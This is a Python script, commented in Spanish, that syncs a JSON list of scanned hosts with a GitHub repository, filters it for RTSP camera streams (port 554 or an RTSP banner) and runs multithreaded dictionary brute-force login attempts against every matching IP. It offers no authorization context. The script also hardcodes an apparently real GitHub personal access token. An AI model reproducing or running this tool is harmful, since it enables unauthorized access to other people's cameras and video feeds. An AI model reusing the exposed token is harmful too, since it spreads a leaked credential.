import json
import requests
import base64
import os
from queue import Queue
from http.server import SimpleHTTPRequestHandler, HTTPServer
import threading
import time
from rtspBrute import RTSPBruteModule
from common import cargar_datos, actualizar_datos
import re

# Configuración de GitHub
GITHUB_TOKEN = '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'  # Token de acceso personal de GitHub
REPO_OWNER = 'TreonSearch'         # Propietario del repositorio
REPO_NAME = 'Tron_Json'            # Nombre del repositorio
FILE_PATH = 'datos.json'           # Ruta al archivo JSON
FILE_NAME = 'datos.json'           # Nombre del archivo en GitHub

def reparar_json_malformado(file_path):
    """Reparar el archivo JSON eliminando líneas hasta encontrar el cierre de un objeto, 
       y luego agregar el corchete de cierre ']'."""
    while True:
        try:
            # Verificar si el archivo realmente existe y tiene tamaño
            if not os.path.exists(file_path):
                print(f"El archivo {file_path} no existe. Se creará un archivo vacío.")
                with open(file_path, 'w', encoding='utf-8') as file:
                    file.write("[]\n")  # Crear un archivo vacío válido
                print(f"El archivo vacío ha sido creado en {file_path}.")
                return
            elif os.path.getsize(file_path) < 5:  # Si el archivo es extremadamente pequeño (menos de 5 bytes)
                print(f"El archivo {file_path} parece estar vacío o con tamaño muy pequeño, será reparado.")
                with open(file_path, 'w', encoding='utf-8') as file:
                    file.write("[]\n")  # Crear un archivo vacío válido
                print(f"El archivo vacío ha sido creado en {file_path}.")
                return

            # Leer el archivo
            with open(file_path, 'r', encoding='utf-8') as file:
                lines = file.readlines()

            # Buscar la posición de la línea que contiene "Preview" y eliminar hasta el cierre
            found_preview = False
            while lines:
                # Buscar "Preview" y el cierre "}"
                if '"Preview": null' in lines[-1]:
                    found_preview = True
                    break
                lines.pop()

            # Si se encuentra el "Preview" y el cierre "}", agregar el corchete de cierre
            if found_preview:
                # Buscar el cierre de la estructura de objetos y agregar el corchete
                if not lines[-1].strip().endswith('}'):
                    lines.append("}\n")
                lines.append("]\n")

                # Guardar el JSON reparado en el archivo
                with open(file_path, 'w', encoding='utf-8') as file:
                    file.writelines(lines)

                print(f"Archivo JSON reparado y guardado en {file_path}.")
                break  # Salir del bucle si el JSON es válido

        except json.JSONDecodeError:
            print(f"Error al analizar el JSON en {file_path}. Intentando reparar línea por línea...")
            time.sleep(1)  # Esperar un segundo antes de reintentar
        except Exception as e:
            print(f"Ocurrió un error al reparar el JSON: {e}")
            break  # Salir del bucle si ocurre un error no esperado



def download_from_github():
    """Descargar el archivo datos.json desde GitHub si es más grande que el archivo local."""
    url = f'https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{FILE_NAME}'
    headers = {'Authorization': f'token {GITHUB_TOKEN}'}
    
    # Obtener los metadatos del archivo en GitHub
    response = requests.get(url, headers=headers)
    
    if response.status_code == 200:
        # Obtener tamaño del archivo remoto
        remote_size = response.json()['size']
        print(f'Tamaño del archivo remoto: {remote_size} bytes')

        # Verificar si el archivo local existe y su tamaño
        if os.path.exists(FILE_PATH):
            local_size = os.path.getsize(FILE_PATH)
            print(f'Tamaño del archivo local: {local_size} bytes')

            # Descargar el archivo si el remoto es más grande
            if remote_size > local_size:
                download_url = response.json()['download_url']
                print("El archivo remoto es más grande, descargando...")

                # Descargar el archivo
                download_response = requests.get(download_url)
                with open(FILE_PATH, 'wb') as file:
                    file.write(download_response.content)
                print("Archivo descargado exitosamente desde GitHub.")
        else:
            print("El archivo local no existe, descargando el archivo remoto.")
            download_url = response.json()['download_url']
            download_response = requests.get(download_url)
            with open(FILE_PATH, 'wb') as file:
                file.write(download_response.content)
            print("Archivo descargado exitosamente desde GitHub.")
    else:
        print(f"Error al obtener el archivo de GitHub: {response.content}")

def upload_to_github():
    """Subir el archivo datos.json a GitHub."""
    with open(FILE_PATH, 'r') as file:
        content = file.read()

    # Codificar el contenido del archivo en base64
    encoded_content = base64.b64encode(content.encode()).decode()

    # URL para la API de GitHub
    url = f'https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{FILE_NAME}'
    headers = {'Authorization': f'token {GITHUB_TOKEN}'}

    # Intentar obtener el sha del archivo (en caso de que ya exista)
    response = requests.get(url, headers=headers)
    
    # Si el archivo ya existe, obtenemos el sha
    if response.status_code == 200:
        sha = response.json()['sha']
        data = {
            'message': 'Actualización del archivo datos.json',
            'content': encoded_content,
            'sha': sha,
            'branch': 'main'
        }
    else:
        # Si el archivo no existe, no se incluye sha
        data = {
            'message': 'Subida del archivo datos.json',
            'content': encoded_content,
            'branch': 'main'
        }

    # Subir o actualizar el archivo
    response = requests.put(url, headers=headers, json=data)

    if response.status_code == 201 or response.status_code == 200:
        print("Archivo subido/actualizado correctamente.")
    else:
        print(f"Error al subir el archivo: {response.content}")

def brute_force_worker(q, dictionary_file):
    while True:
        target = q.get()
        if target is None:
            break
        ip, port = target
        brute = RTSPBruteModule()
        brute.setup(targets=[(ip, port)], dictionary_file=dictionary_file)
        brute.run()
        q.task_done()

def start_http_server():
    port = 8080
    server_address = ('', port)
    httpd = HTTPServer(server_address, SimpleHTTPRequestHandler)
    print(f'Servidor iniciado en http://127.0.0.1:{port}')

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("Servidor detenido.")
        httpd.server_close()

if __name__ == '__main__':
    # Descargar el archivo desde GitHub si es necesario
    download_from_github()

    # Reparar el archivo JSON
    reparar_json_malformado(FILE_PATH)

    # Subir el archivo a GitHub
    upload_to_github()

    # Leer el archivo JSON reparado
    with open(FILE_PATH, 'r', encoding='utf-8') as file:
        json_data = file.read()

    # Convertir el JSON a un objeto Python
    try:
        data = json.loads(json_data)
    except json.JSONDecodeError as e:
        print(f"Error al analizar el JSON: {e}")
        exit(1)

    # Filtrar las entradas para obtener solo las que usan el puerto 554 o contienen 'RTSP' en el banner
    targets = [(entry['IP'], entry['Puerto']) for entry in data if 'RTSP' in entry.get('Banner', '') or entry.get('Puerto') == 554]

    # Crear una cola para los trabajos de brute force
    q = Queue()
    
    # Enviar los targets a la cola
    for target in targets:
        q.put(target)

    # Crear e iniciar los hilos de brute force
    dictionary_file = "diccionario.txt"  # Asegúrate de que este archivo exista
    num_worker_threads = 4  # Ajusta el número de hilos según sea necesario
    for _ in range(num_worker_threads):
        threading.Thread(target=brute_force_worker, args=(q, dictionary_file), daemon=True).start()

    # Esperar a que todos los trabajos se completen
    q.join()

    # Iniciar el servidor HTTP en un hilo separado
    server_thread = threading.Thread(target=start_http_server, daemon=True)
    server_thread.start()

    # Mantener el programa principal corriendo
    server_thread.join()
